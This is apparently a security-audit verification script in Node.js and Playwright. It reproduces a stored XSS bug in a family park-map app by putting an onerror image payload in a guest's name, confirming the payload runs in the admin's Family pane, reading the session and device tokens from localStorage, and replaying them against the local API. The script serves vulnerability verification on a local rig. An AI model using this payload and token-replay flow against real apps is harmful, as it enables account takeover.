// Skeptic #2 for "xss-family-name-unescaped". Independent of the investigator's script: the guest is added through the
// real Me -> Add a guest sheet (typing into #gname, pressing Add guest), not a raw API call. The guest shares from the
// park map; Eli (admin, iPad) then opens the Family pane and taps the guest's row. The payload stores the shell's
// localStorage object on top.XS, which proves injected script can read hub.session / hub.device (nothing leaves the rig).
// Run: node "audits/tools/phase3/dollywood-live/verify-xss-family-name-unescaped-2.mjs"
import fs from 'node:fs';
import path from 'node:path';
import { local, sleep, EV, openMap, putAt, grant } from './_lib.mjs';
const PREFIX = 'verify-xss-family-name-unescaped-2';
const PAYLOAD = '<img src=x onerror=top.XS=localStorage>';
const out = { payload: PAYLOAD, payloadLength: PAYLOAD.length };
const L = await local({ variant: 'park', clock: 'real', engine: 'webkit' });
try {
  // 1. Mom adds the guest through the shipped sheet.
  const mom = await L.device({ device: 'iphone-pwa', profile: 'mom', fixedTime: false });
  await mom.goto('#me'); await sleep(2000);
  await mom.page.click('#guest-add'); await sleep(500);
  await mom.page.fill('#gname', PAYLOAD);
  out.gnameValueAfterTyping = await mom.page.inputValue('#gname');
  await mom.page.click('#gexp button[data-x="keep"]');
  await mom.page.click('#gform button[type=submit]'); await sleep(2000);
  const profs = await L.apiAs('eli', '/api/profiles');
  const g = (profs.body.profiles || []).find(p => p.name === PAYLOAD);
  out.guestCreatedViaUI = g ? { id: g.id, name: g.name, kind: g.kind } : null;
  out.momPageExecuted = await mom.page.evaluate(() => !!window.XS);
  if (!g) throw new Error('guest not created through the sheet');
  // 2. The guest signs in on their own phone, puts a GPS fix in the park and switches on Share my spot.
  await L.sessions();
  const gdev = await L.newDevice({ name: 'Guest phone', profiles: [g.id] });
  const gp = await L.device({ device: 'iphone-pwa', profile: g.id, fixedTime: false, as: gdev });
  await grant(gp, L.site);
  await gp.goto('#home'); await sleep(1500);
  const gf = await openMap(gp, { settle: 1500 });
  await putAt(gp, gf, 800, 850, 6);
  await gf.click('#lv-family'); await sleep(600);
  await gf.click('#lv-share'); await sleep(6000);
  const srv = await L.apiAs('eli', '/api/data/dollywood-live?scope=family');
  const row = (srv.body.items || []).find(r => r.key === 'loc:' + g.id);
  out.serverLocRowName = row ? row.value.name : null;
  // 3. Eli (admin) on the Kitchen iPad opens the Family pane.
  const eli = await L.device({ device: 'ipad-portrait', profile: 'eli', fixedTime: false });
  await eli.goto('#home'); await sleep(1500);
  const ef = await openMap(eli, { settle: 2500 });
  out.eliBeforeFamilyPane = await eli.page.evaluate(() => !!window.XS);
  await ef.click('#lv-family'); await sleep(1500);
  const res = await eli.page.evaluate(() => {
    const XS = window.XS; if (!XS) return { executed: false };
    let s = null, d = null; try { s = JSON.parse(XS['hub.session']); } catch {} try { d = JSON.parse(XS['hub.device']); } catch {}
    return { executed: true, sessionProfileReadable: s && s.profile && s.profile.id, sessionIsAdmin: !!(s && s.profile && (s.profile.is_admin || s.profile.isAdmin)), sessionTokenLength: s && s.token ? String(s.token).length : 0, deviceTokenLength: d && d.token ? String(d.token).length : 0 };
  });
  out.eliAfterFamilyPane = res;
  out.liveImgNodes = await ef.evaluate(() => [...document.querySelectorAll('#fam-list img[onerror]')].map(i => i.outerHTML));
  out.famRowTextContent = await ef.evaluate(id => { const b = document.querySelector(`#fam-list [data-f="${id}"] b`); return b ? { text: b.textContent, innerHTML: b.innerHTML } : null; }, g.id);
  await eli.page.screenshot({ path: path.join(EV, PREFIX + '-eli-family-ipad.png'), scale: 'css', animations: 'disabled' });
  // 4. The card (showFamily) path: reset top.XS and tap the row.
  await eli.page.evaluate(() => { delete window.XS; });
  await ef.click(`#fam-list [data-f="${g.id}"]`); await sleep(1200);
  out.cardPathExecuted = await eli.page.evaluate(() => !!window.XS);
  // 5. Token actually usable by another context: replay the stolen session against the local API (still local only).
  const tok = await eli.page.evaluate(() => { try { const s = JSON.parse(window.XS['hub.session']); const d = JSON.parse(window.XS['hub.device']); return { s: s.token, d: d.token }; } catch { return null; } });
  if (tok) {
    const r = await fetch(L.api + '/api/me', { headers: { 'X-Device-Token': tok.d, 'X-Profile-Token': tok.s } });
    const j = await r.json().catch(() => ({}));
    out.replayedTokenFromOtherClient = { status: r.status, profileId: j.profile && j.profile.id, isAdmin: j.profile && (j.profile.is_admin || j.profile.isAdmin) };
  }
} catch (e) { out.error = String(e && e.stack || e); }
finally {
  fs.writeFileSync(path.join(EV, PREFIX + '.json'), JSON.stringify(out, null, 2));
  console.log(JSON.stringify(out, null, 2));
  await L.close();
}
